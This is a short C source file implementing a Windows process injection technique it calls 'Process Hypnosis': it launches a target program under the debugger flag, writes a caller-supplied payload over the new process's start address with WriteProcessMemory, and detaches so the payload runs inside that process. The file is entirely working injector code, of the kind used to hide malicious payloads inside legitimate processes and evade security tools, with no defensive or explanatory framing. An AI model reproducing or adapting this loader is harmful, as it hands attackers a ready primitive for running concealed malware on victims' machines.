#include "ProcessHypnosis.h"

BOOL CreateTargetProcess
(
	_In_ LPCWSTR TargetProcessPath,
	_Out_ HANDLE* ProcessHandle,
	_Out_ DWORD* ProcessId,
	_Out_ DWORD* ThreadId
)
{

	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFOW);

	if (!CreateProcessW(TargetProcessPath, NULL, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &si, &pi))
	{
		WARN("Failed To Create Process: %ls", TargetProcessPath);
		PRINT_ERROR("CreateProcessW");
		return FALSE; // no point of continuing if we can't even create the process
	}

	INFO("[0x%p] Process Handle", pi.hProcess);
	INFO("\t\t\t\\___ [%ld] ProcessId", pi.dwProcessId);
	INFO("[0x%p] Thread Handle", pi.hThread);
	INFO("\t\t\t\\___ [%ld] ThreadId", pi.dwThreadId);

	*ProcessHandle = pi.hProcess;
	*ProcessId = pi.dwProcessId;
	*ThreadId = pi.dwThreadId;

	return TRUE;

}

BOOLEAN ExecuteProcessHypnosis
(
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize,
	_In_ HANDLE ProcessHandle,
	_In_ DWORD ProcessId,
	_In_ DWORD ThreadId
)
{

	SIZE_T BytesWritten = 0;
	DEBUG_EVENT DebuggedEvent = { 0 };
	RtlSecureZeroMemory(&DebuggedEvent, sizeof(DEBUG_EVENT));

	while (WaitForDebugEvent(&DebuggedEvent, INFINITE))
	{

		switch (DebuggedEvent.dwDebugEventCode)
		{


		case CREATE_THREAD_DEBUG_EVENT:
			break;
		case CREATE_PROCESS_DEBUG_EVENT:
			break;
		case EXCEPTION_DEBUG_EVENT:
			break;


		}

		if (!WriteProcessMemory(ProcessHandle, DebuggedEvent.u.CreateProcessInfo.lpStartAddress, Payload, PayloadSize, &BytesWritten))
		{
			PRINT_ERROR("WriteProcessMemory");
			return FALSE;
		}

		INFO("Wrote %zu bytes to target process", BytesWritten);

		if (!DebugActiveProcessStop(ProcessId))
		{
			PRINT_ERROR("DebugActiveProcessStop");
			return FALSE;
		}

		if (!ContinueDebugEvent(DebuggedEvent.dwProcessId, DebuggedEvent.dwThreadId, DBG_CONTINUE))
		{
			PRINT_ERROR("ContinueDebugEvent");
			return FALSE;
		}

	}

	if (ProcessHandle != NULL && ProcessHandle != INVALID_HANDLE_VALUE)
		CloseHandle(ProcessHandle);

	return TRUE;

}